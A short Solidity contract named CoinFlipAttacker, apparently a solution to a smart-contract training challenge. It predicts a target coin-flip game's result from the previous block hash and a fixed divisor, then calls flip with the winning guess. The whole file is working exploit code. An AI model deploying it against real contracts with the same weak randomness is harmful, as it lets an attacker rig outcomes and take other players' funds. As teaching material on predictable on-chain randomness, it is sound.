// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

interface ICoinFlip {
    function flip(bool _guess) external returns (bool);
}

contract CoinFlipAttacker {
    uint256 FACTOR =
        57896044618658097711785492504343953926634992332820282019728792003956564819968;

    ICoinFlip private coinFlipContract;

    constructor(ICoinFlip _coinFlipContract) public {
        coinFlipContract = _coinFlipContract;
    }

    function attack() external returns (bool) {
        uint256 blockValue = uint256(blockhash(block.number - 1));
        uint256 coinFlip = blockValue / FACTOR;
        bool side = coinFlip == 1 ? true : false;
        return coinFlipContract.flip(side);
    }
}